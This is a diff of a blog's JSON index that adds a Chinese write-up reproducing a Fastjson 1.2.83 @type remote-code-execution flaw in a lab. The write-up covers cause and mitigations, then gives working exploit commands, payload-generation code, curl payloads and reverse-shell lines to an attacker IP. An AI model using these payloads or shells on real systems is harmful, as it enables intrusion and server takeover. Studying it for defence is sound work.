@@ -1,6 +1,30 @@
 {
   "posts": [
     {
+      "slug": "fastjson-1283-jsontype-rce漏洞复现",
+      "title": "Fastjson-1.2.83-jsontype-rce漏洞复现",
+      "source_note": "F:\\self\\ob\\my_obsidian1\\CVE漏洞复现\\Fastjson 1.2.83-jsontype-rce漏洞复现 (QVD-2026-43021).md",
+      "summary": "漏洞概述 1.1 漏洞描述 Fastjson 1.2.83 远程代码执行漏洞（QVD-2026-43021）是阿里巴巴开源 Java JSON 解析库 Fastjson 1.x 系列中存在的一类**严重**安全漏洞，CVSS 3.1 评分为 **9.8（Critical）**。 该漏洞根因在于 `ParserConfig.checkAutoType()` 方",
+      "date_iso": "2026-07-23T10:00:00+08:00",
+      "word_count": 2013,
+      "reading_minutes": 11,
+      "rel_permalink": "list/CVE漏洞复现/fastjson-1283-jsontype-rce漏洞复现",
+      "section_path": [
+        "CVE漏洞复现"
+      ],
+      "categories": [
+        "漏洞复现"
+      ],
+      "tags": [
+        "fastjson",
+        "RCE"
+      ],
+      "featured": false,
+      "body_html": "<h2 id=\"漏洞概述\">漏洞概述</h2>\n<h3 id=\"11-漏洞描述\">1.1 漏洞描述</h3>\n<p>Fastjson 1.2.83 远程代码执行漏洞（QVD-2026-43021）是阿里巴巴开源 Java JSON 解析库 Fastjson 1.x 系列中存在的一类<strong>严重</strong>安全漏洞，CVSS 3.1 评分为 <strong>9.8（Critical）</strong>。</p>\n<p>该漏洞根因在于 <code>ParserConfig.checkAutoType()</code> 方法中的类资源探测路径存在缺陷。当 Fastjson 处理 JSON 中的 <code>@type</code> 字段时，会将用户可控的类型名通过 <code>typeName.replace(&#x27;.&#x27;, &#x27;/&#x27;) + &quot;.class&quot;</code> 拼接为资源路径，并调用 <code>ClassLoader.getResourceAsStream()</code> 进行探测。</p>\n<p>在 Spring Boot FatJar 部署环境下，<code>LaunchedURLClassLoader</code> 支持解析 <code>jar:http://</code> 和 <code>jar:file:</code> 等绝对 URL 资源。攻击者可构造特殊的 <code>@type</code> 值（如 <code>jar:http:..attacker:port/payload!.Exploit</code>），利用点号替换机制将其转换为远程 JAR 包 URL，诱使服务端下载并加载攻击者控制的恶意类。</p>\n<p>恶意类通过 ASM 字节码携带 <code>@JSONType</code> 注解，使 Fastjson 将其视为受信类型并跳过后续安全检查（包括黑白名单和 <code>expectClass</code> 类型兼容性检查），最终通过 <code>TypeUtils.loadClass()</code> 触发 <code>defineClass</code> 加载该类，类的 <code>&amp;lt;clinit&amp;gt;</code> 静态块在加载阶段自动执行，实现远程代码执行。</p>\n<p>该漏洞<strong>无需开启 <code>autoTypeSupport</code></strong>（默认关闭）、<strong>无需目标 classpath 存在任何第三方 Gadget 依赖</strong>，传统删除危险依赖、更新黑名单的防御手段完全失效。</p>\n<h3 id=\"12-影响版本\">1.2 影响版本</h3>\n<p>| 范围 | 说明 | |------|------| | <strong>影响版本</strong> | Fastjson 1.2.68 ~ 1.2.83（含） | | <strong>不受影响版本</strong> | Fastjson 1.2.67 及更早版本（代码路径不存在）；Fastjson 2.x 全系列（架构重构） |</p>\n<h3 id=\"13-利用条件\">1.3 利用条件</h3>\n<p>该漏洞的完整利用需满足以下条件：</p>\n<p>| 条件 | 说明 | |------|------| | <strong>Fastjson 版本</strong> | 1.2.68 ~ 1.2.83 | | <strong>配置</strong> | <code>safeMode=false</code>（默认），<code>autoTypeSupport</code> 无关（默认 <code>false</code> 仍可触发） | | <strong>部署方式</strong> | Spring Boot FatJar（<code>java -jar</code>），ClassLoader 为 <code>LaunchedURLClassLoader</code> | | <strong>JDK 版本</strong> | JDK 8：单阶段直接 RCE；JDK 17/21/25：需两阶段（<code>/proc/self/fd</code>） | | <strong>操作系统</strong> | Linux（依赖 <code>/proc/self/fd</code>），macOS 亦可（<code>/dev/fd</code>） | | <strong>网络可达</strong> | 目标服务器可出网访问攻击者 HTTP 服务 | | <strong>输入入口</strong> | 应用解析外部不可信的 JSON 输入且处理 <code>@type</code> 字段 |</p>\n<h3 id=\"14-漏洞影响\">1.4 漏洞影响</h3>\n<p>成功利用该漏洞可导致：</p>\n<ul><li><strong>远程代码执行（RCE）</strong>：攻击者可在目标服务器上执行任意系统命令，完全控制服务器</li><li><strong>数据泄露</strong>：窃取业务数据、环境变量、配置文件等敏感信息</li><li><strong>内网横向渗透</strong>：以受害服务器为跳板攻击内网其他系统</li><li><strong>业务中断</strong>：植入后门、勒索软件或破坏业务可用性</li></ul>\n<h3 id=\"15-修复与缓解建议\">1.5 修复与缓解建议</h3>\n<h4 id=\"推荐方案\">推荐方案</h4>\n<ul><li><strong>升级至 Fastjson 2.x</strong>：官方已停止 1.x 系列维护，2.x 重构了 AutoType 机制，不受此漏洞影响</li><li>升级地址：https://github.com/alibaba/fastjson2</li></ul>\n<h4 id=\"临时缓解措施\">临时缓解措施</h4>\n<ol><li><strong>启用 SafeMode</strong>（最有效）：完全禁用 AutoType 功能</li></ol>\n<ul><li>代码配置：<code>ParserConfig.getGlobalInstance().setSafeMode(true);</code></li><li>JVM 参数：<code>-Dfastjson.parser.safeMode=true</code></li><li>配置文件：<code>fastjson.parser.safeMode=true</code></li></ul>\n<ol><li><strong>限制出网流量</strong>：阻断应用容器主动访问外部 HTTP 服务</li><li><strong>API 边界过滤</strong>：在网关层拦截包含 <code>@type</code> 字段且值含 <code>jar:</code>、<code>http:</code> 等协议的请求</li><li><strong>使用 WAF 防护</strong>：已部署 WAF 的产品可启用相应拦截规则（如阿里云 WAF 规则 901168/901170/901171）</li></ol>\n<hr>\n<h2 id=\"漏洞复现\">漏洞复现</h2>\n<p><strong>复现项目地址</strong>:https://github.com/hzhsec/fastjson-jsontype-rce-hzhsec</p>\n<h3 id=\"启动靶场\">启动靶场</h3>\n<p>每次测试<strong>必须先启动靶场</strong>，且<strong>每次测试必须重启</strong>（JVM 类加载缓存）。</p>\n<h4 id=\"启动命令\">启动命令</h4>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-bash\" data-lang=\"bash\"># 1. 清理旧进程\nfuser -k 18080/tcp 2&gt;/dev/null\n\n# 2. 启动（JDK 8）\njava -jar target/fastjson-rce-env-1.0.0.jar &amp;\n\n# 启动（JDK 17）\njava -jar target/fastjson-rce-env-1.0.0.jar &amp;\n\n# 3. 确认启动\nsleep 6 &amp;&amp; curl -s http://127.0.0.1:18080/info</code></pre></div>\n<h4 id=\"预期响应\">预期响应</h4>\n<p><img src=\"https://cdn.jsdmirror.com/gh/hzhsec/upload@main/Snipaste_2026-07-22_16-32-58.png\" alt=\"Snipaste_2026-07-22_16-32-58.png\"></p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-json\" data-lang=\"json\">{&quot;safeMode&quot;:false,&quot;autoTypeSupport&quot;:false,&quot;parserConfigCL&quot;:&quot;LaunchedURLClassLoader...&quot;}</code></pre></div>\n<p><strong>关键确认点：</strong></p>\n<ul><li><code>safeMode: false</code> — 漏洞可利用</li><li><code>LaunchedURLClassLoader</code> — Spring Boot FatJar</li><li><code>autoTypeSupport: false</code> — 没开启 autoType 也能打</li></ul>\n<hr>\n<h2 id=\"两种攻击模式\">两种攻击模式</h2>\n<h3 id=\"jdk8-http-模式jdk-8-专用\">JDK8-HTTP 模式（JDK 8 专用）</h3>\n<blockquote><p><strong>适用：</strong> JDK 8  （JDK 9+ 因 defineClass 校验类名而失败） <strong>原理：</strong> IP 用整数表示（避免 replace('.','/')），直接 HTTP 拉取恶意 class</p></blockquote>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-\" data-lang=\"\">switch-java 8\njava -version</code></pre></div>\n<p><img src=\"https://cdn.jsdmirror.com/gh/hzhsec/upload@main/Snipaste_2026-07-22_16-35-15.png\" alt=\"Snipaste_2026-07-22_16-35-15.png\"></p>\n<h3 id=\"一键利用\">一键利用</h3>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-bash\" data-lang=\"bash\">cd poc/\npython3 exp.py 攻击者ip 19090 http://目标ip:18080 --endpoint 自定义端点 --mode 攻击模式</code></pre></div>\n<p>自定义命令：</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-bash\" data-lang=\"bash\">python3 exp.py 192.168.1.107 19090 http://192.168.174.128:18080 --mode jdk8-http --endpoint /parse --cmd &quot;id &gt; /tmp/out.txt&quot;</code></pre></div>\n<p><strong>攻击模式参数</strong>: jdk8-http适合jdk8 fd多版本适合</p>\n<p><strong>反弹shell</strong></p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-python\" data-lang=\"python\">python3 exp.py 192.168.1.107 19090 http://192.168.174.128:18080 --mode jdk8-http --endpoint /parse --cmd &quot;bash -c &#x27;exec bash -i &amp;&gt;/dev/tcp/192.168.1.107/4444 &lt;&amp;1&#x27;&quot;</code></pre></div>\n<p><strong>预期输出：</strong> <img src=\"https://cdn.jsdmirror.com/gh/hzhsec/upload@main/Snipaste_2026-07-22_16-41-25.png\" alt=\"Snipaste_2026-07-22_16-41-25.png\"></p>\n<p><img src=\"https://cdn.jsdmirror.com/gh/hzhsec/upload@main/Snipaste_2026-07-22_16-41-48.png\" alt=\"Snipaste_2026-07-22_16-41-48.png\"></p>\n<h3 id=\"fd-链模式jdk-825-全版本\">FD 链模式（JDK 8~25 全版本）</h3>\n<blockquote><p><strong>适用：</strong> JDK 8/11/17/21/25 全版本 <strong>原理：</strong> 两步走 — ①目标下载恶意 jar → ②枚举 <code>/proc/self/fd/N</code> 找到 jar 并加载 <strong>优点：</strong> 通杀所有 JDK，类名合法不触发 defineClass 校验 <strong>注意：</strong> 需要较长超时（60 秒+，要遍历 253 个 fd）</p></blockquote>\n<p>切换jdk17版本</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-\" data-lang=\"\">switch-java 17\njava -version</code></pre></div>\n<p><img src=\"https://cdn.jsdmirror.com/gh/hzhsec/upload@main/Snipaste_2026-07-22_16-43-54.png\" alt=\"Snipaste_2026-07-22_16-43-54.png\"></p>\n<h3 id=\"一键利用-2\">一键利用</h3>\n<p>自定义命令：</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-bash\" data-lang=\"bash\">cd poc\npython3 exp.py 192.168.1.107 19090 http://192.168.174.128:18080 --mode fd --endpoint /parse --cmd &quot;bash -c &#x27;exec bash -i &amp;&gt;/dev/tcp/192.168.1.107/4444 &lt;&amp;1&#x27;&quot; --timeout 60</code></pre></div>\n<p><strong>预期输出：</strong></p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-\" data-lang=\"\">[*] Fastjson 1.2.83 RCE  |  mode=fd  |  http://192.168.174.128:18080/parse\n    攻击机: 192.168.1.107:19090  命令: id\n  poc/probe.jar &amp; poc/www/probe generated\n  First stage: {&quot;@type&quot;:&quot;jar:http:..3232235883:19090.probe!.foo.Exception&quot;}\n  payload: FD链 (255个, fd 3~256)\n  发送 14587 字节 ...\n  响应 200: {&quot;ok&quot;:true,&quot;class&quot;:&quot;com.alibaba.fastjson.JSONArray&quot;,&quot;result&quot;:&quot;[{\\&quot;@type\\&quot;:\\&quot;jar:http:...</code></pre></div>\n<p>返回 <code>JSONArray</code> 是正常的——Fastjson 解析数组时已触发 RCE，跟返回值无关。</p>\n<p><img src=\"https://cdn.jsdmirror.com/gh/hzhsec/upload@main/Snipaste_2026-07-22_16-43-54.png\" alt=\"Snipaste_2026-07-22_16-43-54.png\"></p>\n<h3 id=\"一键全测先-jdk8-http-后-fd\">一键全测（先 JDK8-HTTP 后 FD）</h3>\n<p>有点问题</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-bash\" data-lang=\"bash\">python3 exp.py 192.168.1.107 19090 http://192.168.174.128:18080 --mode auto --cmd id</code></pre></div>\n<hr>\n<h2 id=\"手工复现\">手工复现</h2>\n<h3 id=\"jdk8-http-手工\">JDK8-HTTP 手工</h3>\n<p><strong>Step 1：生成恶意 class</strong></p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-bash\" data-lang=\"bash\">cd poc/\njava -cp &quot;.;lib/asm-9.6.jar;lib/fastjson-1.2.83.jar&quot; \\\n  GenProbe 192.168.1.107 19090 &quot;id &gt; /tmp/out.txt&quot; jdk8-http</code></pre></div>\n<blockquote><p>Linux 把 <code>;</code> 换成 <code>:</code></p></blockquote>\n<p><strong>Step 2：攻击主机启动 HTTP 托管</strong></p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-bash\" data-lang=\"bash\">cd www/\npython3 -m http.server 19090\n# 保持此终端不关闭</code></pre></div>\n<p><strong>Step 3：另开终端，发送 Payload</strong></p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-bash\" data-lang=\"bash\"># IP 需整数化：\n# python3 -c &quot;import struct,socket; print(struct.unpack(&#x27;!I&#x27;, socket.inet_aton(&#x27;192.168.1.107&#x27;))[0])&quot;\n# → 3232235883\n\ncurl -X POST http://目标:18080/parse \\\n  -H &quot;Content-Type: application/json&quot; \\\n  -d &#x27;{&quot;@type&quot;:&quot;http:..3232235883:19090.a&quot;}&#x27;\n\n# 预期响应: {&quot;ok&quot;:true,&quot;class&quot;:&quot;http:..3232235883:19090.a&quot;,&quot;result&quot;:&quot;...&quot;}</code></pre></div>\n<h3 id=\"fd-链手工\">FD 链手工</h3>\n<p><strong>Step 1：生成恶意 probe.jar</strong></p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-bash\" data-lang=\"bash\">cd poc/\njava -cp &quot;poc;poc/lib/asm-9.6.jar;poc/lib/fastjson-1.2.83.jar&quot; GenProbe 192.168.1.107 19090 &quot;bash -c &#x27;exec bash -i &amp;&gt;/dev/tcp/192.168.1.107/4444 &lt;&amp;1&#x27;&quot; fd</code></pre></div>\n<p><strong>Step 2：攻击主机启动 HTTP 托管</strong></p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-bash\" data-lang=\"bash\">cd www/\npython3 -m http.server 19090</code></pre></div>\n<p><strong>Step 3：构造并发送 FD 链 Payload</strong> 目录下面的mk.py文件</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-bash\" data-lang=\"bash\">\nimport json\nitems = [{&quot;@type&quot;: &quot;jar:http:..3232235883:19090.probe!.foo.Exception&quot;}]\nfor fd in range(3, 257):\n    items.append({&quot;@type&quot;: f&quot;jar:file:.proc.self.fd.{fd}!.fd{fd}.Exception&quot;})\njson.dump(items, open(&quot;payload.json&quot;, &quot;w&quot;))\nprint(f&quot;payload: {len(items)} items&quot;)</code></pre></div>\n<p>上面这个payload生成脚本的3232235883记得修改成自己的攻击ip对应的十进制</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-\" data-lang=\"\">在payload.py目录执行\ncurl -X POST http://192.168.174.128:18080/\nparse -H &quot;Content-Type: application/json&quot; -d @payload.json --max-time 60</code></pre></div>\n<p><img src=\"https://cdn.jsdmirror.com/gh/hzhsec/upload@main/Snipaste_2026-07-22_17-19-02.png\" alt=\"Snipaste_2026-07-22_17-19-02.png\"></p>\n<p><strong>免责声明</strong> 本文档所包含的漏洞复现方法、技术细节及利用代码，<strong>仅限用于授权的安全测试、教育学习与研究目的</strong>。 <strong>严禁</strong>在未获得明确授权的情况下，对任何系统进行测试或攻击。任何不当使用所导致的法律责任及后果，均由使用者自行承担。 作者与文档提供者不承担任何因滥用本文档信息而产生的直接或间接责任。请遵守您所在地的法律法规，并始终践行负责任的网络安全实践。</p>",
+      "toc_html": "<nav id=\"TableOfContents\"><ul><li class=\"toc-item toc-depth-1\"><details class=\"toc-branch toc-depth-1\"><summary><a class=\"toc-link\" href=\"#漏洞概述\">漏洞概述</a></summary><div class=\"toc-children\"><ul><li class=\"toc-item toc-depth-2\"><a class=\"toc-link\" href=\"#11-漏洞描述\">1.1 漏洞描述</a></li><li class=\"toc-item toc-depth-2\"><a class=\"toc-link\" href=\"#12-影响版本\">1.2 影响版本</a></li><li class=\"toc-item toc-depth-2\"><a class=\"toc-link\" href=\"#13-利用条件\">1.3 利用条件</a></li><li class=\"toc-item toc-depth-2\"><a class=\"toc-link\" href=\"#14-漏洞影响\">1.4 漏洞影响</a></li><li class=\"toc-item toc-depth-2\"><a class=\"toc-link\" href=\"#15-修复与缓解建议\">1.5 修复与缓解建议</a></li></ul></div></details></li><li class=\"toc-item toc-depth-1\"><details class=\"toc-branch toc-depth-1\"><summary><a class=\"toc-link\" href=\"#漏洞复现\">漏洞复现</a></summary><div class=\"toc-children\"><ul><li class=\"toc-item toc-depth-2\"><a class=\"toc-link\" href=\"#启动靶场\">启动靶场</a></li></ul></div></details></li><li class=\"toc-item toc-depth-1\"><details class=\"toc-branch toc-depth-1\"><summary><a class=\"toc-link\" href=\"#两种攻击模式\">两种攻击模式</a></summary><div class=\"toc-children\"><ul><li class=\"toc-item toc-depth-2\"><a class=\"toc-link\" href=\"#jdk8-http-模式jdk-8-专用\">JDK8-HTTP 模式（JDK 8 专用）</a></li><li class=\"toc-item toc-depth-2\"><a class=\"toc-link\" href=\"#一键利用\">一键利用</a></li><li class=\"toc-item toc-depth-2\"><a class=\"toc-link\" href=\"#fd-链模式jdk-825-全版本\">FD 链模式（JDK 8~25 全版本）</a></li><li class=\"toc-item toc-depth-2\"><a class=\"toc-link\" href=\"#一键利用-2\">一键利用</a></li><li class=\"toc-item toc-depth-2\"><a class=\"toc-link\" href=\"#一键全测先-jdk8-http-后-fd\">一键全测（先 JDK8-HTTP 后 FD）</a></li></ul></div></details></li><li class=\"toc-item toc-depth-1\"><details class=\"toc-branch toc-depth-1\"><summary><a class=\"toc-link\" href=\"#手工复现\">手工复现</a></summary><div class=\"toc-children\"><ul><li class=\"toc-item toc-depth-2\"><a class=\"toc-link\" href=\"#jdk8-http-手工\">JDK8-HTTP 手工</a></li><li class=\"toc-item toc-depth-2\"><a class=\"toc-link\" href=\"#fd-链手工\">FD 链手工</a></li></ul></div></details></li></ul></nav>",
+      "article_body_text": "漏洞概述\n1.1 漏洞描述\nFastjson 1.2.83 远程代码执行漏洞（QVD-2026-43021）是阿里巴巴开源 Java JSON 解析库 Fastjson 1.x 系列中存在的一类**严重**安全漏洞，CVSS 3.1 评分为 **9.8（Critical）**。\n该漏洞根因在于 `ParserConfig.checkAutoType()` 方法中的类资源探测路径存在缺陷。当 Fastjson 处理 JSON 中的 `@type` 字段时，会将用户可控的类型名通过 `typeName.replace('.', '/') + \".class\"` 拼接为资源路径，并调用 `ClassLoader.getResourceAsStream()` 进行探测。\n在 Spring Boot FatJar 部署环境下，`LaunchedURLClassLoader` 支持解析 `jar:http://` 和 `jar:file:` 等绝对 URL 资源。攻击者可构造特殊的 `@type` 值（如 `jar:http:..attacker:port/payload!.Exploit`），利用点号替换机制将其转换为远程 JAR 包 URL，诱使服务端下载并加载攻击者控制的恶意类。\n恶意类通过 ASM 字节码携带 `@JSONType` 注解，使 Fastjson 将其视为受信类型并跳过后续安全检查（包括黑白名单和 `expectClass` 类型兼容性检查），最终通过 `TypeUtils.loadClass()` 触发 `defineClass` 加载该类，类的 `<clinit>` 静态块在加载阶段自动执行，实现远程代码执行。\n该漏洞**无需开启 `autoTypeSupport`**（默认关闭）、**无需目标 classpath 存在任何第三方 Gadget 依赖**，传统删除危险依赖、更新黑名单的防御手段完全失效。\n1.2 影响版本\n| 范围 | 说明 | |------|------| | **影响版本** | Fastjson 1.2.68 ~ 1.2.83（含） | | **不受影响版本** | Fastjson 1.2.67 及更早版本（代码路径不存在）；Fastjson 2.x 全系列（架构重构） |\n1.3 利用条件\n该漏洞的完整利用需满足以下条件：\n| 条件 | 说明 | |------|------| | **Fastjson 版本** | 1.2.68 ~ 1.2.83 | | **配置** | `safeMode=false`（默认），`autoTypeSupport` 无关（默认 `false` 仍可触发） | | **部署方式** | Spring Boot FatJar（`java -jar`），ClassLoader 为 `LaunchedURLClassLoader` | | **JDK 版本** | JDK 8：单阶段直接 RCE；JDK 17/21/25：需两阶段（`/proc/self/fd`） | | **操作系统** | Linux（依赖 `/proc/self/fd`），macOS 亦可（`/dev/fd`） | | **网络可达** | 目标服务器可出网访问攻击者 HTTP 服务 | | **输入入口** | 应用解析外部不可信的 JSON 输入且处理 `@type` 字段 |\n1.4 漏洞影响\n成功利用该漏洞可导致：\n**远程代码执行（RCE）**：攻击者可在目标服务器上执行任意系统命令，完全控制服务器\n**数据泄露**：窃取业务数据、环境变量、配置文件等敏感信息\n**内网横向渗透**：以受害服务器为跳板攻击内网其他系统\n**业务中断**：植入后门、勒索软件或破坏业务可用性\n1.5 修复与缓解建议\n推荐方案\n**升级至 Fastjson 2.x**：官方已停止 1.x 系列维护，2.x 重构了 AutoType 机制，不受此漏洞影响\n升级地址：https://github.com/alibaba/fastjson2\n临时缓解措施\n**启用 SafeMode**（最有效）：完全禁用 AutoType 功能\n代码配置：`ParserConfig.getGlobalInstance().setSafeMode(true);`\nJVM 参数：`-Dfastjson.parser.safeMode=true`\n配置文件：`fastjson.parser.safeMode=true`\n**限制出网流量**：阻断应用容器主动访问外部 HTTP 服务\n**API 边界过滤**：在网关层拦截包含 `@type` 字段且值含 `jar:`、`http:` 等协议的请求\n**使用 WAF 防护**：已部署 WAF 的产品可启用相应拦截规则（如阿里云 WAF 规则 901168/901170/901171）\n漏洞复现\n**复现项目地址**:https://github.com/hzhsec/fastjson-jsontype-rce-hzhsec\n启动靶场\n每次测试**必须先启动靶场**，且**每次测试必须重启**（JVM 类加载缓存）。\n启动命令\n# 1. 清理旧进程\nfuser -k 18080/tcp 2>/dev/null\n\n# 2. 启动（JDK 8）\njava -jar target/fastjson-rce-env-1.0.0.jar &\n\n# 启动（JDK 17）\njava -jar target/fastjson-rce-env-1.0.0.jar &\n\n# 3. 确认启动\nsleep 6 && curl -s http://127.0.0.1:18080/info\n预期响应\n![Snipaste_2026-07-22_16-32-58.png](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/Snipaste_2026-07-22_16-32-58.png)\n{\"safeMode\":false,\"autoTypeSupport\":false,\"parserConfigCL\":\"LaunchedURLClassLoader...\"}\n**关键确认点：**\n`safeMode: false` — 漏洞可利用\n`LaunchedURLClassLoader` — Spring Boot FatJar\n`autoTypeSupport: false` — 没开启 autoType 也能打\n两种攻击模式\nJDK8-HTTP 模式（JDK 8 专用）\n**适用：** JDK 8  （JDK 9+ 因 defineClass 校验类名而失败） **原理：** IP 用整数表示（避免 replace('.','/')），直接 HTTP 拉取恶意 class\nswitch-java 8\njava -version\n![Snipaste_2026-07-22_16-35-15.png](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/Snipaste_2026-07-22_16-35-15.png)\n一键利用\ncd poc/\npython3 exp.py 攻击者ip 19090 http://目标ip:18080 --endpoint 自定义端点 --mode 攻击模式\n自定义命令：\npython3 exp.py 192.168.1.107 19090 http://192.168.174.128:18080 --mode jdk8-http --endpoint /parse --cmd \"id > /tmp/out.txt\"\n**攻击模式参数**: jdk8-http适合jdk8 fd多版本适合\n**反弹shell**\npython3 exp.py 192.168.1.107 19090 http://192.168.174.128:18080 --mode jdk8-http --endpoint /parse --cmd \"bash -c 'exec bash -i &>/dev/tcp/192.168.1.107/4444 <&1'\"\n**预期输出：** ![Snipaste_2026-07-22_16-41-25.png](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/Snipaste_2026-07-22_16-41-25.png)\n![Snipaste_2026-07-22_16-41-48.png](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/Snipaste_2026-07-22_16-41-48.png)\nFD 链模式（JDK 8~25 全版本）\n**适用：** JDK 8/11/17/21/25 全版本 **原理：** 两步走 — ①目标下载恶意 jar → ②枚举 `/proc/self/fd/N` 找到 jar 并加载 **优点：** 通杀所有 JDK，类名合法不触发 defineClass 校验 **注意：** 需要较长超时（60 秒+，要遍历 253 个 fd）\n切换jdk17版本\nswitch-java 17\njava -version\n![Snipaste_2026-07-22_16-43-54.png](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/Snipaste_2026-07-22_16-43-54.png)\n一键利用\n自定义命令：\ncd poc\npython3 exp.py 192.168.1.107 19090 http://192.168.174.128:18080 --mode fd --endpoint /parse --cmd \"bash -c 'exec bash -i &>/dev/tcp/192.168.1.107/4444 <&1'\" --timeout 60\n**预期输出：**\n[*] Fastjson 1.2.83 RCE  |  mode=fd  |  http://192.168.174.128:18080/parse\n    攻击机: 192.168.1.107:19090  命令: id\n  poc/probe.jar & poc/www/probe generated\n  First stage: {\"@type\":\"jar:http:..3232235883:19090.probe!.foo.Exception\"}\n  payload: FD链 (255个, fd 3~256)\n  发送 14587 字节 ...\n  响应 200: {\"ok\":true,\"class\":\"com.alibaba.fastjson.JSONArray\",\"result\":\"[{\\\"@type\\\":\\\"jar:http:...\n返回 `JSONArray` 是正常的——Fastjson 解析数组时已触发 RCE，跟返回值无关。\n![](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/Snipaste_2026-07-22_16-43-54.png)\n一键全测（先 JDK8-HTTP 后 FD）\n有点问题\npython3 exp.py 192.168.1.107 19090 http://192.168.174.128:18080 --mode auto --cmd id\n手工复现\nJDK8-HTTP 手工\n**Step 1：生成恶意 class**\ncd poc/\njava -cp \".;lib/asm-9.6.jar;lib/fastjson-1.2.83.jar\" \\\n  GenProbe 192.168.1.107 19090 \"id > /tmp/out.txt\" jdk8-http\nLinux 把 `;` 换成 `:`\n**Step 2：攻击主机启动 HTTP 托管**\ncd www/\npython3 -m http.server 19090\n# 保持此终端不关闭\n**Step 3：另开终端，发送 Payload**\n# IP 需整数化：\n# python3 -c \"import struct,socket; print(struct.unpack('!I', socket.inet_aton('192.168.1.107'))[0])\"\n# → 3232235883\n\ncurl -X POST http://目标:18080/parse \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"@type\":\"http:..3232235883:19090.a\"}'\n\n# 预期响应: {\"ok\":true,\"class\":\"http:..3232235883:19090.a\",\"result\":\"...\"}\nFD 链手工\n**Step 1：生成恶意 probe.jar**\ncd poc/\njava -cp \"poc;poc/lib/asm-9.6.jar;poc/lib/fastjson-1.2.83.jar\" GenProbe 192.168.1.107 19090 \"bash -c 'exec bash -i &>/dev/tcp/192.168.1.107/4444 <&1'\" fd\n**Step 2：攻击主机启动 HTTP 托管**\ncd www/\npython3 -m http.server 19090\n**Step 3：构造并发送 FD 链 Payload** 目录下面的mk.py文件\n\nimport json\nitems = [{\"@type\": \"jar:http:..3232235883:19090.probe!.foo.Exception\"}]\nfor fd in range(3, 257):\n    items.append({\"@type\": f\"jar:file:.proc.self.fd.{fd}!.fd{fd}.Exception\"})\njson.dump(items, open(\"payload.json\", \"w\"))\nprint(f\"payload: {len(items)} items\")\n上面这个payload生成脚本的3232235883记得修改成自己的攻击ip对应的十进制\n在payload.py目录执行\ncurl -X POST http://192.168.174.128:18080/\nparse -H \"Content-Type: application/json\" -d @payload.json --max-time 60\n![Snipaste_2026-07-22_17-19-02.png](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/Snipaste_2026-07-22_17-19-02.png)\n**免责声明** 本文档所包含的漏洞复现方法、技术细节及利用代码，**仅限用于授权的安全测试、教育学习与研究目的**。 **严禁**在未获得明确授权的情况下，对任何系统进行测试或攻击。任何不当使用所导致的法律责任及后果，均由使用者自行承担。 作者与文档提供者不承担任何因滥用本文档信息而产生的直接或间接责任。请遵守您所在地的法律法规，并始终践行负责任的网络安全实践。"
+    },
+    {
       "slug": "aicryptoproxy-ai-fu-neng-ni-xiang-web-jia-mi-liu-liang",
       "title": "AICryptoProxy：AI 赋能逆向Web 加密流量",
       "source_note": "F:\\hugo\\bak\\halo_to_publish\\工具使用\\aicryptoproxy-ai-fu-neng-ni-xiang-web-jia-mi-liu-liang.md",
@@ -3614,289 +3638,6 @@
       "title": "环境搭建",
       "parent": "list",
       "order": 67
-    }
-  },
-  "categories": {
-    "工具使用": {
-      "dir_name": "工具使用",
-      "posts": [
-        "aicryptoproxy-ai-fu-neng-ni-xiang-web-jia-mi-liu-liang",
-        "sqlmap-cheatsheet-and-advanced-usage",
-        "reconinspector-yi-kuan-ji-fofa-nuclei-yu-pocmo-ban-diao-shi-yu-yi-ti-de-ke-shi-hua-an-quan-xun-jian-ping-tai"
-      ],
-      "page": 1
-    },
-    "权限提升": {
-      "dir_name": "权限提升",
-      "posts": [
-        "windows-privilege-escalation-uac-dll-service",
-        "dirtyfrag_linuxnei-he-ben-di-ti-quan-lou-dong-qvd-2026-24699",
-        "database-privilege-escalation-guide",
-        "computer-user-privilege-elevation-and-reduction",
-        "linux-privilege-escalation-mysql-udf-capability-ld-preload",
-        "windows-privilege-escalation-manual-potato",
-        "linux-privilege-escalation-lxd-docker-rbash",
-        "linux-privilege-escalation-nfs-cron-path",
-        "linux-privilege-escalation-suid-sudo-cve",
-        "windows-privilege-escalation-basic-guide",
-        "linux-kernel-exploit-privilege-escalation"
-      ],
-      "page": 1
-    },
-    "应急响应": {
-      "dir_name": "应急响应",
-      "posts": [
-        "an-quan-she-bei-nidsru-qin-jian-ce-xi-tong",
-        "an-quan-she-bei-hidsji-yu-zhu-ji-de-ru-qin-jian-ce-xi-tong",
-        "2.c2hou-men-fa-xian-yu-chu-zhi",
-        "4.diao-yu-you-jian-fen-xi-yu-pai-cha",
-        "5.mi-ma-bao-po-ri-zhi-fen-xi-yu-sui-dao-liu-liang-jian-cha",
-        "3.wa-kuang-bing-du-pai-cha-fen-xi",
-        "1.webru-qin-cha-sha-zhi-nan"
-      ],
-      "page": 1
-    },
-    "漏洞复现": {
-      "dir_name": "漏洞复现",
-      "posts": [
-        "apache_shiro-cve-2016-4437-fan-xu-lie-hua-lou-dong-fu-xian",
-        "cve-2025-8088-winrar",
-        "7ziplou-dong-fu-xian-he-ji",
